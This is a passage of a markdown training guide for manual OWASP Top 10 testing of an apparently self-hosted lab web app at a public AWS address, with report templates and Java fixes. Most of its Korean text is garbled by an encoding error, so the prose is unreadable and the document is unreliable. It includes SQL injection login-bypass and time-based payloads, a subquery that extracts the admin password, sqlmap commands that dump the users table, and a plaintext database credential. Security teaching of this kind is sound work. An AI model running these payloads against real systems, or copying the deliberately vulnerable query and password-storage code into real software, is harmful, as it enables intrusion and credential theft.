---
sidebar_position: 1
title: ì›¹ ë³´ì•ˆ ì·¨ì•½ì  ìˆ˜ë™ ì§„ë‹¨ ê°€ì´ë“œ
description: OWASP TOP 10 (2021) ìˆ˜ë™ ì§„ë‹¨ ì ìš©í•´ë³´ê¸°
keywords: [sk]
draft: false
---

# ì›¹ ë³´ì•ˆ ì·¨ì•½ì  ìˆ˜ë™ ì§„ë‹¨ ì‹¤ìŠµ ê°€ì´ë“œ

> **í”„ë¡œì íŠ¸**: SK Rookies Mini Project 2 - ì›¹ ë³´ì•ˆ ì·¨ì•½ì  ì§„ë‹¨  
> **ëŒ€ìƒ ì„œë²„**: http://3.34.212.183/ (AWS EC2)  
> **ì§„ë‹¨ ë²”ìœ„**: OWASP TOP 10 (2021) + ì¶”ê°€ ì›¹ ì·¨ì•½ì   
> **ì†Œìš” ì‹œê°„**: ì•½ 4-6ì‹œê°„ (íŒ€ì› 2-3ëª… í˜‘ì—… ì‹œ)  
> **ë²„ì „**: 2.1 (ë§ˆí¬ë‹¤ìš´ ìˆ˜ì •ë³¸)

---

## ğŸ“Œ ì¤‘ìš” ê³µì§€

ì´ ë¬¸ì„œëŠ” **ì‹¤ìŠµ ê°€ì´ë“œ**ì…ë‹ˆë‹¤. 
ê° ì‹¤ìŠµ ë§ˆì§€ë§‰ì˜ "ğŸ“ ë³´ê³ ì„œ ì‘ì„±" ë¶€ë¶„ì€ **ì—¬ëŸ¬ë¶„ì´ ì‘ì„±í•  ë³´ê³ ì„œì˜ ì˜ˆì‹œ**ì…ë‹ˆë‹¤.

---

## ğŸ“‘ ëª©ì°¨

- [0. ì‹¤ìŠµ í™˜ê²½ ì¤€ë¹„](#0-ì‹¤ìŠµ-í™˜ê²½-ì¤€ë¹„)
- [A01: Broken Access Control](#a01-broken-access-control)
- [A02: Cryptographic Failures](#a02-cryptographic-failures)
- [A03: Injection](#a03-injection)
- [A04: Insecure Design](#a04-insecure-design)
- [A05: Security Misconfiguration](#a05-security-misconfiguration)
- [A06: Vulnerable Components](#a06-vulnerable-components)
- [A07: Authentication Failures](#a07-authentication-failures)
- [A08: Data Integrity Failures](#a08-data-integrity-failures)
- [A09: Logging Failures](#a09-logging-failures)
- [A10: SSRF](#a10-ssrf)
- [ì¶”ê°€ ì·¨ì•½ì ](#ì¶”ê°€-ì·¨ì•½ì )
- [ìµœì¢… ë³´ê³ ì„œ](#ìµœì¢…-ë³´ê³ ì„œ)

---

## 0. ì‹¤ìŠµ í™˜ê²½ ì¤€ë¹„

### 0.1 ì‹¤ìŠµ ì „ ì²´í¬ë¦¬ìŠ¤íŠ¸

- â˜ ì„œë²„ ë°°í¬ ì™„ë£Œ (http://3.34.212.183/ ì ‘ì† í™•ì¸)
- â˜ Kali Linux ë˜ëŠ” í…ŒìŠ¤íŠ¸ í™˜ê²½ ì¤€ë¹„
- â˜ BurpSuite Community ì„¤ì¹˜ ì™„ë£Œ
- â˜ Firefox/Chrome ë¸Œë¼ìš°ì € ì¤€ë¹„
- â˜ í…ŒìŠ¤íŠ¸ ê³„ì • 2ê°œ ìƒì„± ì™„ë£Œ

### 0.2 í•„ìˆ˜ ë„êµ¬ ì„¤ì¹˜

```bash
# BurpSuite ì‹¤í–‰
burpsuite

# ì¶”ê°€ ë„êµ¬ ì„¤ì¹˜
sudo apt update
sudo apt install -y sqlmap nikto wireshark curl jq
```

### 0.3 í…ŒìŠ¤íŠ¸ ê³„ì • ìƒì„±

http://3.34.212.183/register.html ì—ì„œ 2ê°œ ê³„ì • ìƒì„±:

**ê³„ì • 1 (ê³µê²©ì)**:
- ì•„ì´ë””: attacker
- ë¹„ë°€ë²ˆí˜¸: Test1234!@
- ì´ë©”ì¼: attacker@test.com
- íšŒì› ìœ í˜•: ë¬´ë£Œ íšŒì›
- ì „í™”ë²ˆí˜¸: 010-1111-1111

**ê³„ì • 2 (í”¼í•´ì)**:
- ì•„ì´ë””: victim  
- ë¹„ë°€ë²ˆí˜¸: Test1234!@
- ì´ë©”ì¼: victim@test.com
- íšŒì› ìœ í˜•: ë¬´ë£Œ íšŒì›
- ì „í™”ë²ˆí˜¸: 010-2222-2222

### 0.4 BurpSuite ì´ˆê¸° ì„¤ì •

1. BurpSuite ì‹¤í–‰
2. Proxy â†’ Options â†’ Proxy Listeners â†’ 127.0.0.1:8080 í™•ì¸
3. Proxy â†’ Intercept â†’ Intercept is on
4. Firefox í”„ë¡ì‹œ ì„¤ì •: 127.0.0.1:8080

---

## A01: Broken Access Control

### ğŸ“– ì´ë¡ 

ì‚¬ìš©ìê°€ ìì‹ ì˜ ê¶Œí•œì„ ë„˜ì–´ì„œ ë‹¤ë¥¸ ì‚¬ìš©ì ë°ì´í„° ì ‘ê·¼ ë˜ëŠ” ê´€ë¦¬ì ê¸°ëŠ¥ ì‚¬ìš© ê°€ëŠ¥í•œ ì·¨ì•½ì 

**ì¢…ë¥˜**:

- ìˆ˜í‰ ê¶Œí•œ ìƒìŠ¹: ê°™ì€ ê¶Œí•œì˜ ë‹¤ë¥¸ ì‚¬ìš©ì ë°ì´í„° ì ‘ê·¼
- ìˆ˜ì§ ê¶Œí•œ ìƒìŠ¹: ì¼ë°˜ ì‚¬ìš©ìê°€ ê´€ë¦¬ì ê¸°ëŠ¥ ì ‘ê·¼  
- IDOR: ID íŒŒë¼ë¯¸í„° ì¡°ì‘

### ğŸ¯ í…ŒìŠ¤íŠ¸ ëŒ€ìƒ

| ê¸°ëŠ¥ | URL | ì·¨ì•½ì  ìœ í˜• |
|------|-----|------------|
| ë§ˆì´í˜ì´ì§€ | `/api/member/me` | ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ë…¸ì¶œ |
| ë¬¸ì˜ê¸€ ìƒì„¸ | `/api/inquiry/detail?id=N` | IDOR + ë¹„ë°€ê¸€ ìš°íšŒ |
| ê³µì§€ì‚¬í•­ ì‘ì„± | `/api/notice/write` | ìˆ˜ì§ ê¶Œí•œ ìƒìŠ¹ â­ |

---

### ğŸ§ª ì‹¤ìŠµ 1-1: ë§ˆì´í˜ì´ì§€ ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ë…¸ì¶œ

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `MemberController.java` Line 41

```java
userInfo.put("password", rs.getString("password"));
// âš ï¸ API ì‘ë‹µì— ë¹„ë°€ë²ˆí˜¸ í¬í•¨!
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: attacker ê³„ì • ë¡œê·¸ì¸ â†’ ë§ˆì´í˜ì´ì§€ ì ‘ì†

**Step 2**: BurpSuiteì—ì„œ `/api/member/me` ì‘ë‹µ í™•ì¸

```json
{
  "userId": "attacker",
  "password": "Test1234!@",  // ğŸ”´ í‰ë¬¸ ë…¸ì¶œ!
  "email": "attacker@test.com"
}
```

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [BAC-001] ë§ˆì´í˜ì´ì§€ ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ë…¸ì¶œ

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì½”ë“œ ìœ„ì¹˜**: `MemberController.java` Line 41

**ì·¨ì•½ì  ì„¤ëª…**:  
/api/member/me APIê°€ ì‚¬ìš©ì ì •ë³´ ë°˜í™˜ ì‹œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í‰ë¬¸ìœ¼ë¡œ í¬í•¨í•©ë‹ˆë‹¤.

**ì¬í˜„ ë°©ë²•**:
1. ë¡œê·¸ì¸ í›„ ë§ˆì´í˜ì´ì§€ ì ‘ì†
2. BurpSuiteë¡œ /api/member/me ì‘ë‹µ í™•ì¸
3. Responseì— "password": "í‰ë¬¸" í¬í•¨ë¨

**ì˜í–¥**:
- XSSì™€ ê²°í•© ì‹œ ë¹„ë°€ë²ˆí˜¸ íƒˆì·¨
- ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œ ë…¸ì¶œ
- ë¡œê·¸ íŒŒì¼ì— ë¹„ë°€ë²ˆí˜¸ ì €ì¥ ìœ„í—˜

**ê¶Œì¥ ì¡°ì¹˜**:

```java
// API ì‘ë‹µì—ì„œ ë¹„ë°€ë²ˆí˜¸ í•„ë“œ ì œê±°
// userInfo.put("password", rs.getString("password")); â† ì‚­ì œ

// ë˜ëŠ” ë§ˆìŠ¤í‚¹
userInfo.put("password", "********");
```

---

### ğŸ§ª ì‹¤ìŠµ 1-2: ë¬¸ì˜ê¸€ ë¹„ë°€ê¸€ ìš°íšŒ

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `InquiryController.java` Line 80-86

```java
if ("Y".equals(secret)) {
    if (loginUser == null || !loginUser.equals(writer)) {
        map.put("status", "forbidden");
        return map;
    }
}
// âŒ ê´€ë¦¬ì ì˜ˆì™¸ ì²˜ë¦¬ ì£¼ì„ ì²˜ë¦¬ë¨!
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: victim ê³„ì •ìœ¼ë¡œ ë¹„ë°€ê¸€ ì‘ì„± (id=5)

**Step 2**: attacker ê³„ì •ìœ¼ë¡œ ì ‘ê·¼ ì‹œë„

```http
GET /api/inquiry/detail?id=5 HTTP/1.1
```

**ì˜ˆìƒ ê²°ê³¼**: `{"status": "forbidden"}` âœ… ì•ˆì „

**Step 3**: ê´€ë¦¬ì ê³„ì •ìœ¼ë¡œ ì ‘ê·¼ ì‹œë„

**ì˜ˆìƒ ê²°ê³¼**: `{"status": "forbidden"}` ğŸŸ¡ ë²„ê·¸ (ê´€ë¦¬ìë„ ëª» ë´„)

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [BAC-002] ê´€ë¦¬ì ë¹„ë°€ê¸€ ì ‘ê·¼ ë¶ˆê°€ (ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ë²„ê·¸)

**ìœ„í—˜ë„**: ğŸŸ¡ MEDIUM

**ì½”ë“œ ìœ„ì¹˜**: `InquiryController.java` Line 80-86

**ì·¨ì•½ì  ì„¤ëª…**:  
ë¹„ë°€ê¸€ ì ‘ê·¼ ì œì–´ê°€ ë„ˆë¬´ ê°•ë ¥í•˜ì—¬ ê´€ë¦¬ìë„ ì‚¬ìš©ì ë¹„ë°€ ë¬¸ì˜ë¥¼ ë³¼ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

**ì¬í˜„ ë°©ë²•**:
1. ì¼ë°˜ ì‚¬ìš©ìê°€ ë¹„ë°€ê¸€ ì‘ì„±
2. ê´€ë¦¬ì ê³„ì •ìœ¼ë¡œ ì ‘ê·¼ â†’ forbidden ë°˜í™˜

**ì˜í–¥**:
- ê³ ê° ì§€ì› ì—…ë¬´ ë¶ˆê°€
- ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ì˜¤ë¥˜

**ê¶Œì¥ ì¡°ì¹˜**:

```java
if ("Y".equals(secret)) {
    if (loginUser == null) {
        return forbidden();
    }

    // ê´€ë¦¬ì ê¶Œí•œ ì²´í¬ ì¶”ê°€
    String roleSql = "SELECT role FROM users WHERE user_id = ?";
    PreparedStatement roleStmt = conn.prepareStatement(roleSql);
    roleStmt.setString(1, loginUser);
    ResultSet roleRs = roleStmt.executeQuery();

    if (roleRs.next()) {
        String role = roleRs.getString("role");
        // ê´€ë¦¬ìê°€ ì•„ë‹ˆê³  ì‘ì„±ìë„ ì•„ë‹ˆë©´ ì°¨ë‹¨
        if (!"ADMIN".equals(role) && !loginUser.equals(writer)) {
            return forbidden();
        }
    }
}
```

---

### ğŸ§ª ì‹¤ìŠµ 1-3: ê³µì§€ì‚¬í•­ ì‘ì„± ê¶Œí•œ ìš°íšŒ â­ NEW

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `NoticeController.java` Line 43-45

```java
String loginUser = (String) session.getAttribute("loginUser");
if (loginUser == null) return "ë¡œê·¸ì¸ í•„ìš”";
// âŒ ê´€ë¦¬ì ê¶Œí•œ ì²´í¬ ì—†ìŒ!
// ì£¼ì„: "role ì»¬ëŸ¼ ì²´í¬ í•„ìˆ˜" ë¼ê³  ë˜ì–´ ìˆì§€ë§Œ ë¯¸êµ¬í˜„
```

**ëŒ€ì¡°**: `LectureMaterialController.java` Line 56-62ëŠ” ì œëŒ€ë¡œ ê¶Œí•œ ì²´í¬í•¨

```java
String roleSql = "SELECT role FROM users WHERE user_id = ?";
if (!rs.next() || !"ADMIN".equals(rs.getString("role"))) {
    return "ê¶Œí•œì´ ì—†ìŠµë‹ˆë‹¤.";
}
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: attacker (ì¼ë°˜ ì‚¬ìš©ì)ë¡œ ë¡œê·¸ì¸

**Step 2**: http://3.34.212.183/notice_write.html ì ‘ì†

**Step 3**: ê³µì§€ì‚¬í•­ ì‘ì„±

- ì œëª©: [ì¤‘ìš”] ì„œë²„ ì ê²€ ì•ˆë‚´
- ë‚´ìš©: ê¸ˆì¼ 23ì‹œë¶€í„° ì„œë²„ ì ê²€ ì˜ˆì •

**Step 4**: BurpSuiteë¡œ ìš”ì²­ í™•ì¸

```http
POST /api/notice/write HTTP/1.1
Content-Type: application/x-www-form-urlencoded

type=ê³µì§€&title=[ì¤‘ìš”]...&content=...
```

**Step 5**: Forward â†’ "ê³µì§€ ë“±ë¡ ì™„ë£Œ" ğŸ”´ ì·¨ì•½!

**Step 6**: ë¹„êµ í…ŒìŠ¤íŠ¸ - ê°•ì˜ìë£Œ ì‘ì„± ì‹œë„

```http
POST /api/material/write HTTP/1.1
```

â†’ "ê¶Œí•œì´ ì—†ìŠµë‹ˆë‹¤" âœ… ì•ˆì „

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [BAC-003] ê³µì§€ì‚¬í•­ ì‘ì„± ê¶Œí•œ ë¯¸ê²€ì¦ (ìˆ˜ì§ ê¶Œí•œ ìƒìŠ¹)

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì½”ë“œ ìœ„ì¹˜**: `NoticeController.java` Line 43-45

**ì·¨ì•½ì  ì„¤ëª…**:  
ê³µì§€ì‚¬í•­ ì‘ì„± ì‹œ ë¡œê·¸ì¸ ì—¬ë¶€ë§Œ í™•ì¸í•˜ê³  ê´€ë¦¬ì ê¶Œí•œì„ ê²€ì¦í•˜ì§€ ì•Šì•„, ì¼ë°˜ ì‚¬ìš©ìê°€ ê³µì§€ì‚¬í•­ì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì¬í˜„ ë°©ë²•**:
1. ì¼ë°˜ ì‚¬ìš©ì ë¡œê·¸ì¸
2. /notice_write.html ì ‘ì†
3. ê³µì§€ì‚¬í•­ ì‘ì„± â†’ ì„±ê³µ

**ì˜í–¥**:
- í—ˆìœ„ ê³µì§€ì‚¬í•­ìœ¼ë¡œ ì‚¬ìš©ì í˜¼ë€
- í”¼ì‹± ë§í¬ í¬í•¨í•œ ì•…ì„± ê³µì§€ ê²Œì‹œ
- ì„œë¹„ìŠ¤ ì‹ ë¢°ë„ í•˜ë½

**ê¶Œì¥ ì¡°ì¹˜**:

```java
String loginUser = (String) session.getAttribute("loginUser");
if (loginUser == null) return "ë¡œê·¸ì¸ í•„ìš”";

// ê´€ë¦¬ì ê¶Œí•œ ì²´í¬ ì¶”ê°€
String roleSql = "SELECT role FROM users WHERE user_id = ?";
PreparedStatement checkStmt = conn.prepareStatement(roleSql);
checkStmt.setString(1, loginUser);
ResultSet rs = checkStmt.executeQuery();

if (!rs.next() || !"ADMIN".equals(rs.getString("role"))) {
    return "ê¶Œí•œì´ ì—†ìŠµë‹ˆë‹¤.";
}

// ê³µì§€ì‚¬í•­ ë“±ë¡ ë¡œì§...
```

---

### ğŸ§ª ì‹¤ìŠµ 1-4: IDOR (ìˆœì°¨ì  ID ë…¸ì¶œ)

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ë¬¸ì˜ê¸€ ëª©ë¡ í™•ì¸

```json
[
  {"id": 1, "title": "ë¬¸ì˜1"},
  {"id": 2, "title": "ë¬¸ì˜2"},
  {"id": 3, "title": "ë¬¸ì˜3"}
]
```

**Step 2**: BurpSuite Intruderë¡œ ID ìˆœì°¨ ì ‘ê·¼

- Payload: 1~100
- `/api/inquiry/detail?id=Â§1Â§`

**Step 3**: ê²°ê³¼ ë¶„ì„

- 200 OK: ì ‘ê·¼ ê°€ëŠ¥
- forbidden: ë¹„ë°€ê¸€
- not_found: ì¡´ì¬ ì•ˆí•¨

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [IDOR-001] ìˆœì°¨ì  ë¬¸ì˜ê¸€ ID ë…¸ì¶œ

**ìœ„í—˜ë„**: ğŸŸ¢ LOW

**ì·¨ì•½ì  ì„¤ëª…**:  
ë¬¸ì˜ê¸€ IDê°€ ìˆœì°¨ì ìœ¼ë¡œ ì¦ê°€í•˜ì—¬ ì „ì²´ ë¬¸ì˜ê¸€ ê°œìˆ˜ ë° íƒ€ì¸ ë¬¸ì˜ê¸€ ID ì¶”ì¸¡ ê°€ëŠ¥

**ì¬í˜„ ë°©ë²•**:
1. ë¬¸ì˜ê¸€ ì‘ì„± â†’ ID 5 ë°˜í™˜
2. ë‹¤ìŒ ë¬¸ì˜ê¸€ì€ ID 6ì„ì„ ì¶”ì¸¡ ê°€ëŠ¥

**ì˜í–¥**:
- ì „ì²´ ë¬¸ì˜ ê±´ìˆ˜ ë…¸ì¶œ
- ë¹„ë°€ê¸€ ì™¸ íƒ€ì¸ ë¬¸ì˜ê¸€ ì ‘ê·¼ ê°€ëŠ¥

**ê¶Œì¥ ì¡°ì¹˜**:  
UUID ì‚¬ìš© ë˜ëŠ” ì‚¬ìš©ìë³„ ê²©ë¦¬ëœ ID ì²´ê³„ ì‚¬ìš©

---

## A02: Cryptographic Failures

### ğŸ“– ì´ë¡ 

ë¯¼ê°í•œ ë°ì´í„°ë¥¼ í‰ë¬¸ìœ¼ë¡œ ì €ì¥/ì „ì†¡í•˜ëŠ” ì·¨ì•½ì 

**ë¯¼ê° ë°ì´í„°**: ë¹„ë°€ë²ˆí˜¸, ê°œì¸ì •ë³´, ì„¸ì…˜ í† í°, API í‚¤

### ğŸ¯ í…ŒìŠ¤íŠ¸ ëŒ€ìƒ

| ê¸°ëŠ¥ | URL | ì·¨ì•½ì  |
|------|-----|--------|
| ë¡œê·¸ì¸ | `/api/login` | HTTP í‰ë¬¸ í†µì‹  |
| íšŒì›ê°€ì… | `/api/register` | ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ì €ì¥ |

---

### ğŸ§ª ì‹¤ìŠµ 2-1: HTTP í‰ë¬¸ í†µì‹ 

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: Wireshark ì‹¤í–‰

```bash
sudo wireshark &
# í•„í„°: http and host 3.34.212.183
```

**Step 2**: ë¡œê·¸ì¸ ì‹œë„ (attacker / Test1234!@)

**Step 3**: Wiresharkì—ì„œ íŒ¨í‚· ë¶„ì„

```http
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=attacker&pw=Test1234!@
```

ğŸ”´ ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ë…¸ì¶œ!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [CRYPTO-001] HTTP í‰ë¬¸ í†µì‹ 

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì·¨ì•½ì  ì„¤ëª…**:  
HTTPS ë¯¸ì‚¬ìš©ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œ ë¹„ë°€ë²ˆí˜¸ ë…¸ì¶œ

**ì¬í˜„ ë°©ë²•**:
1. Wireshark ìº¡ì²˜
2. ë¡œê·¸ì¸
3. POST /api/login íŒ¨í‚·ì—ì„œ í‰ë¬¸ í™•ì¸

**ì˜í–¥**:
- ì¤‘ê°„ì ê³µê²© (MITM)
- ê³µìš© Wi-Fiì—ì„œ ë¹„ë°€ë²ˆí˜¸ íƒˆì·¨

**ê¶Œì¥ ì¡°ì¹˜**:
- HTTPS ì ìš© (SSL/TLS ì¸ì¦ì„œ)
- HTTP â†’ HTTPS ê°•ì œ ë¦¬ë‹¤ì´ë ‰íŠ¸
- HSTS í—¤ë” ì¶”ê°€

---

### ğŸ§ª ì‹¤ìŠµ 2-2: ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ì €ì¥

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `AuthController.java` Line 52

```java
pstmt.setString(3, password); // ì•”í˜¸í™” ì—†ìŒ!
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: testuser / MySecret123! ê³„ì • ìƒì„±

**Step 2**: DB í™•ì¸ (SSH ì ‘ì† ê°€ëŠ¥ ì‹œ)

```bash
mysql -u lecture -p
# ë¹„ë°€ë²ˆí˜¸: lecture123

USE lecture_db;
SELECT user_id, password FROM users WHERE user_id='testuser';
```

**ì˜ˆìƒ ê²°ê³¼**:

```
+----------+--------------+
| user_id  | password     |
+----------+--------------+
| testuser | MySecret123! |  â† ğŸ”´ í‰ë¬¸!
+----------+--------------+
```

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [CRYPTO-002] ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸ ì €ì¥

**ìœ„í—˜ë„**: ğŸ”´ CRITICAL

**ì½”ë“œ ìœ„ì¹˜**: `AuthController.java` Line 52

**ì·¨ì•½ì  ì„¤ëª…**:  
ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ë¥¼ í•´ì‹œ ì—†ì´ DBì— í‰ë¬¸ ì €ì¥

**ì¬í˜„ ë°©ë²•**:
1. íšŒì›ê°€ì…
2. DB ì¡°íšŒ ì‹œ í‰ë¬¸ í™•ì¸

**ì˜í–¥**:
- DB ìœ ì¶œ ì‹œ ëª¨ë“  ê³„ì • íƒˆì·¨
- ë‚´ë¶€ì ê³µê²©
- íƒ€ ì‚¬ì´íŠ¸ ë™ì¼ ë¹„ë°€ë²ˆí˜¸ ì—°ì‡„ í”¼í•´

**ê¶Œì¥ ì¡°ì¹˜**:

```java
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

@PostMapping("/api/register")
public String register(..., @RequestParam String password, ...) {
    BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
    String hashedPassword = encoder.encode(password);

    pstmt.setString(3, hashedPassword);
    ...
}

@PostMapping("/api/login")
public String login(..., @RequestParam String pw, ...) {
    String hashedPassword = rs.getString("password");

    BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
    if (encoder.matches(pw, hashedPassword)) {
        // ë¡œê·¸ì¸ ì„±ê³µ
    }
}
```

---

## A03: Injection

### ğŸ“– ì´ë¡ 

ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì…ë ¥ê°’ì´ ëª…ë ¹ì–´/ì¿¼ë¦¬ì˜ ì¼ë¶€ë¡œ ì‹¤í–‰ë˜ëŠ” ì·¨ì•½ì 

**ì¢…ë¥˜**: SQL Injection, Command Injection, LDAP, XPath

### ğŸ¯ í…ŒìŠ¤íŠ¸ ëŒ€ìƒ

| ê¸°ëŠ¥ | URL | ì·¨ì•½ì  |
|------|-----|--------|
| ë¡œê·¸ì¸ | `/api/login` | SQL Injection |
| ë¬¸ì˜ê¸€ ì‘ì„± | `/api/inquiry/write` | SQL Injection |

---

### ğŸ§ª ì‹¤ìŠµ 3-1: SQL Injection - ë¡œê·¸ì¸ ìš°íšŒ

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `AuthController.java` Line 23

```java
String sql = "SELECT * FROM users WHERE user_id = '" + id + "' AND password = '" + pw + "'";
```

String concatenation â†’ SQL Injection ì·¨ì•½!

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ì •ìƒ ë¡œê·¸ì¸ (attacker / Test1234!@)

**Step 2**: SQL Injection í˜ì´ë¡œë“œ

**í˜ì´ë¡œë“œ 1**: ì£¼ì„ ìš°íšŒ

```
ID: admin' --
PW: (ì•„ë¬´ê±°ë‚˜)
```

ì‹¤ì œ ì¿¼ë¦¬:

```sql
SELECT * FROM users WHERE user_id = 'admin' --' AND password = 'xxx'
```

`--` ì´í›„ ì£¼ì„ ì²˜ë¦¬ë¨!

**í˜ì´ë¡œë“œ 2**: OR ì¡°ê±´

```
ID: admin' OR '1'='1
PW: (ì•„ë¬´ê±°ë‚˜)
```

**Step 3**: BurpSuite Repeater

```http
POST /api/login HTTP/1.1

id=admin'+OR+'1'='1'--+&pw=xxx
```

Send â†’ "ë¡œê·¸ì¸ ì„±ê³µ" ğŸ”´ ì·¨ì•½!

**Step 4**: sqlmap ìë™í™” (ì„ íƒ)

```bash
sqlmap -r login_request.txt --batch --dbs
sqlmap -r login_request.txt --batch -D lecture_db --tables
sqlmap -r login_request.txt --batch -D lecture_db -T users --dump
```

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [SQLi-001] ë¡œê·¸ì¸ SQL Injection

**ìœ„í—˜ë„**: ğŸ”´ CRITICAL

**ì½”ë“œ ìœ„ì¹˜**: `AuthController.java` Line 23

**ì·¨ì•½ì  ì„¤ëª…**:  
ì‚¬ìš©ì ì…ë ¥ê°’ì„ ì§ì ‘ ì¿¼ë¦¬ì— ì‚½ì…í•˜ì—¬ SQL Injection ê³µê²©ì— ì·¨ì•½

**ì¬í˜„ ë°©ë²•**:
1. IDì— `admin' --` ì…ë ¥
2. ë¡œê·¸ì¸ ì„±ê³µ (ë¹„ë°€ë²ˆí˜¸ ê²€ì¦ ìš°íšŒ)

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**:

    ì›ë³¸: SELECT * FROM users WHERE user_id = 'admin' --' AND password = 'xxx'
    ê²°ê³¼: SELECT * FROM users WHERE user_id = 'admin'

**ì˜í–¥**:
- ëª¨ë“  ê³„ì • ë¬´ë‹¨ ì ‘ê·¼
- DB ì „ì²´ ë¤í”„
- ì‹œìŠ¤í…œ ëª…ë ¹ì–´ ì‹¤í–‰ ê°€ëŠ¥

**ê¶Œì¥ ì¡°ì¹˜**:

```java
// PreparedStatement ì‚¬ìš©
String sql = "SELECT * FROM users WHERE user_id = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, id);
pstmt.setString(2, pw);
ResultSet rs = pstmt.executeQuery();
```

---

### ğŸ§ª ì‹¤ìŠµ 3-2: SQL Injection - ë¬¸ì˜ê¸€ ì‘ì„±

#### ì·¨ì•½ì  ìœ„ì¹˜

**íŒŒì¼**: `InquiryController.java` Line 24-32

```java
String sql = "INSERT INTO inquiry (type, title, content, writer, secret, created_at) VALUES (" +
        "'" + type + "'," +
        "'" + title + "'," +
        "'" + content + "'," +
        ...
```

#### ì‹¤ìŠµ ë‹¨ê³„

**Step 1**: ì •ìƒ ë¬¸ì˜ê¸€ ì‘ì„±

**Step 2**: SQL Injection í˜ì´ë¡œë“œ

ë‚´ìš©ì— ì…ë ¥:

```
Normal', (SELECT password FROM users WHERE user_id='admin'), 'N', NOW()); --
```

**Step 3**: Blind SQL Injection

```
test' AND SLEEP(5)) --
```

ì‘ë‹µ ì‹œê°„ 5ì´ˆ ì´ìƒ â†’ ì·¨ì•½!

#### ğŸ“ ë³´ê³ ì„œ ì˜ˆì‹œ

**ì·¨ì•½ì ëª…**: [SQLi-002] ë¬¸ì˜ê¸€ ì‘ì„± SQL Injection

**ìœ„í—˜ë„**: ğŸ”´ HIGH

**ì½”ë“œ ìœ„ì¹˜**: `InquiryController.java` Line 24-32

**ì·¨ì•½ì  ì„¤ëª…**:  
ë¬¸ì˜ê¸€ ì…ë ¥ê°’ì„ ì§ì ‘ ì¿¼ë¦¬ì— ì‚½ì…í•˜ì—¬ SQL Injection ì·¨ì•½

**ì¬í˜„ ë°©ë²•**:
1. ë‚´ìš©ì— `', (SELECT password FROM users), 'N', NOW()); --` ì…ë ¥
2. ì„œë¸Œì¿¼ë¦¬ë¡œ ë‹¤ë¥¸ í…Œì´ë¸” ë°ì´í„° ì¡°ì‘ ê°€ëŠ¥

**ê¶Œì¥ ì¡°ì¹˜**:

```java
String sql = "INSERT INTO inquiry (type, title, content, writer, secret, created_at) VALUES (?, ?, ?, ?, ?, NOW())";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, type);
pstmt.setString(2, title);
pstmt.setString(3, content);
pstmt.setString(4, loginUser);
pstmt.setString(5, secret);
pstmt.executeUpdate();
```

---

## A04: Insecure Design

### ğŸ“– ì´ë¡ 

ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ìì²´ì˜ ì„¤ê³„ ê²°í•¨

**ì˜ˆì‹œ**: ë¬´ì œí•œ ì‹œë„, ê°€ê²© ì¡°ì‘, í”„ë¡œì„¸ìŠ¤ ìš°íšŒ, ê¶Œí•œ íŒŒë¼ë¯¸í„° ì¡°ì‘

### ğŸ¯ í…ŒìŠ¤íŠ¸ ëŒ€ìƒ

| ê¸°ëŠ¥ | ì·¨ì•½ì  |
|------|--------|
| ë¡œê·¸ì¸ | ë¸Œë£¨íŠ¸í¬ìŠ¤ ë°©ì–´ ì—†ìŒ |
| íšŒì›ê°€ì… | CAPTCHA ì—†ìŒ |
| íšŒì›ê°€ì… | role íŒŒë¼ë¯¸í„° ì¡°ì‘ â­ |

---

